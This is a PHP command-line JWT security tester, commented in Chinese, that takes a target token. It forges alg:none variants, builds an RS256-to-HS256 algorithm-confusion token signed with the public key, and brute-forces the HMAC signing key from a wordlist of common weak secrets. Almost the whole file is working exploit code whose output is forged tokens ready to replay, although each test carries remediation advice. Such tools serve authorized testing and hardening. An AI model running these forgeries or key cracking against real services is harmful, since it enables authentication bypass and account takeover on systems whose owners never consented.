<?php
/**
 * JWT Tester - JWT 安全测试工具
 * 测试 JWT 实现中的常见漏洞：Algorithm None、RS256→HS256 混淆、弱密钥爆破
 *
 * Usage: php jwt_tester.php <token> [public_key_file]
 *   <token>           - 目标 JWT token
 *   [public_key_file] - RS256 公钥文件路径（用于算法混淆测试）
 *
 * Output: JSON format test results
 */

class JwtTester {

    private string $originalToken;
    private array $header;
    private array $payload;
    private string $signature;
    private ?string $publicKeyFile;
    private array $results = [];

    /** Common weak secrets for brute force */
    private array $weakKeys = [
        'secret', 'password', '123456', 'key', 'admin', 'test',
        'jwt_secret', 'changeme', 'default', 'qwerty', '12345678',
        'abc123', 'letmein', 'welcome', 'monkey', 'master',
        'token', 'pass', 'jwt', 'hmac', 'signing_key',
        'supersecret', 'mysecret', 'hs256-key', 'my-secret',
    ];

    public function __construct(string $token, ?string $publicKeyFile = null) {
        $this->originalToken = $token;
        $this->publicKeyFile = $publicKeyFile;
        $this->parseToken($token);
    }

    /**
     * Base64URL encode
     */
    private function base64UrlEncode(string $data): string {
        return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
    }

    /**
     * Base64URL decode
     */
    private function base64UrlDecode(string $data): string {
        $remainder = strlen($data) % 4;
        if ($remainder) {
            $data .= str_repeat('=', 4 - $remainder);
        }
        return base64_decode(strtr($data, '-_', '+/'));
    }

    /**
     * Parse JWT token into header, payload, signature
     */
    private function parseToken(string $token): void {
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            throw new RuntimeException('Invalid JWT format: expected 3 parts separated by dots');
        }

        $headerJson = $this->base64UrlDecode($parts[0]);
        $payloadJson = $this->base64UrlDecode($parts[1]);

        $this->header = json_decode($headerJson, true) ?: [];
        $this->payload = json_decode($payloadJson, true) ?: [];
        $this->signature = $parts[2];
    }

    /**
     * Build a JWT from parts
     */
    private function buildToken(array $header, array $payload, string $signature = ''): string {
        $headerEncoded = $this->base64UrlEncode(json_encode($header));
        $payloadEncoded = $this->base64UrlEncode(json_encode($payload));
        return $headerEncoded . '.' . $payloadEncoded . '.' . $signature;
    }

    /**
     * Test 1: Algorithm "none" attack
     * Construct token with alg:"none" and empty signature
     */
    public function testAlgorithmNone(): array {
        $noneVariants = ['none', 'None', 'NONE', 'nOnE'];
        $forgedTokens = [];

        foreach ($noneVariants as $alg) {
            $header = $this->header;
            $header['alg'] = $alg;

            // Empty signature
            $token = $this->buildToken($header, $this->payload, '');
            $forgedTokens[] = [
                'alg_value' => $alg,
                'token' => $token,
                'description' => "Algorithm set to '{$alg}' with empty signature",
            ];

            // Also try without trailing dot
            $headerEncoded = $this->base64UrlEncode(json_encode($header));
            $payloadEncoded = $this->base64UrlEncode(json_encode($this->payload));
            $tokenNoDot = $headerEncoded . '.' . $payloadEncoded . '.';
            $forgedTokens[] = [
                'alg_value' => $alg,
                'token' => $tokenNoDot,
                'description' => "Algorithm set to '{$alg}' with trailing dot only",
            ];
        }

        $result = [
            'test' => 'algorithm_none',
            'risk' => 'critical',
            'description' => 'JWT alg:none bypass - server may accept unsigned tokens',
            'original_alg' => $this->header['alg'] ?? 'unknown',
            'forged_tokens' => $forgedTokens,
            'remediation' => 'Whitelist allowed algorithms; never accept "none" in production',
        ];

        $this->results['algorithm_none'] = $result;
        return $result;
    }

    /**
     * Test 2: RS256 to HS256 algorithm confusion
     * Sign with public key as HMAC secret
     */
    public function testAlgorithmConfusion(): array {
        $result = [
            'test' => 'algorithm_confusion',
            'risk' => 'critical',
            'description' => 'RS256→HS256 confusion: sign with public key as HMAC secret',
            'original_alg' => $this->header['alg'] ?? 'unknown',
        ];

        if (!$this->publicKeyFile || !file_exists($this->publicKeyFile)) {
            $result['status'] = 'skipped';
            $result['reason'] = 'No public key file provided or file not found';
            $this->results['algorithm_confusion'] = $result;
            return $result;
        }

        $publicKey = file_get_contents($this->publicKeyFile);
        if ($publicKey === false) {
            $result['status'] = 'error';
            $result['reason'] = 'Failed to read public key file';
            $this->results['algorithm_confusion'] = $result;
            return $result;
        }

        // Build token with HS256 algorithm, signed with the public key as secret
        $header = $this->header;
        $header['alg'] = 'HS256';

        $headerEncoded = $this->base64UrlEncode(json_encode($header));
        $payloadEncoded = $this->base64UrlEncode(json_encode($this->payload));
        $signingInput = $headerEncoded . '.' . $payloadEncoded;

        $signature = $this->base64UrlEncode(
            hash_hmac('sha256', $signingInput, $publicKey, true)
        );

        $forgedToken = $signingInput . '.' . $signature;

        $result['status'] = 'generated';
        $result['forged_token'] = $forgedToken;
        $result['public_key_used'] = $this->publicKeyFile;
        $result['remediation'] = 'Use explicit algorithm verification; do not derive alg from token header';

        $this->results['algorithm_confusion'] = $result;
        return $result;
    }

    /**
     * Test 3: Weak key brute force
     * Try signing with common secrets and compare signatures
     */
    public function testWeakKeyBruteForce(): array {
        $result = [
            'test' => 'weak_key_bruteforce',
            'risk' => 'high',
            'description' => 'Dictionary brute force of HMAC signing key',
            'original_alg' => $this->header['alg'] ?? 'unknown',
        ];

        $alg = strtoupper($this->header['alg'] ?? '');
        $hashAlgMap = [
            'HS256' => 'sha256',
            'HS384' => 'sha384',
            'HS512' => 'sha512',
        ];

        if (!isset($hashAlgMap[$alg])) {
            $result['status'] = 'skipped';
            $result['reason'] = "Algorithm '{$alg}' is not HMAC-based; brute force not applicable";
            $this->results['weak_key_bruteforce'] = $result;
            return $result;
        }

        $hashAlg = $hashAlgMap[$alg];
        $parts = explode('.', $this->originalToken);
        $signingInput = $parts[0] . '.' . $parts[1];
        $originalSignature = $parts[2];

        $testedKeys = [];
        $foundKey = null;

        foreach ($this->weakKeys as $candidate) {
            $candidateSig = $this->base64UrlEncode(
                hash_hmac($hashAlg, $signingInput, $candidate, true)
            );

            $matched = hash_equals($candidateSig, $originalSignature);
            $testedKeys[] = [
                'key' => $candidate,
                'matched' => $matched,
            ];

            if ($matched) {
                $foundKey = $candidate;
                break;
            }
        }

        $result['keys_tested'] = count($testedKeys);
        $result['dictionary_size'] = count($this->weakKeys);

        if ($foundKey !== null) {
            $result['status'] = 'vulnerable';
            $result['found_key'] = $foundKey;
            $result['severity'] = 'critical';
            $result['remediation'] = 'Use a strong, random secret key (>= 256 bits)';
        } else {
            $result['status'] = 'not_found';
            $result['note'] = 'Key not in dictionary; may still be weak - try larger wordlists';
        }

        $result['tested_keys'] = $testedKeys;
        $this->results['weak_key_bruteforce'] = $result;
        return $result;
    }

    /**
     * Run all tests
     */
    public function runAllTests(): array {
        $this->testAlgorithmNone();
        $this->testAlgorithmConfusion();
        $this->testWeakKeyBruteForce();

        return [
            'token_info' => [
                'header' => $this->header,
                'payload' => $this->payload,
                'original_alg' => $this->header['alg'] ?? 'unknown',
            ],
            'tests' => $this->results,
            'timestamp' => date('c'),
        ];
    }
}

// CLI entry
if (php_sapi_name() === 'cli') {
    if (!isset($argv[1])) {
        echo "Usage: php jwt_tester.php <token> [public_key_file]\n";
        exit(1);
    }

    $token = $argv[1];
    $publicKeyFile = $argv[2] ?? null;

    try {
        $tester = new JwtTester($token, $publicKeyFile);
        $results = $tester->runAllTests();
        echo json_encode($results, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
    } catch (RuntimeException $e) {
        echo json_encode(['error' => $e->getMessage()], JSON_PRETTY_PRINT) . "\n";
        exit(1);
    }
}
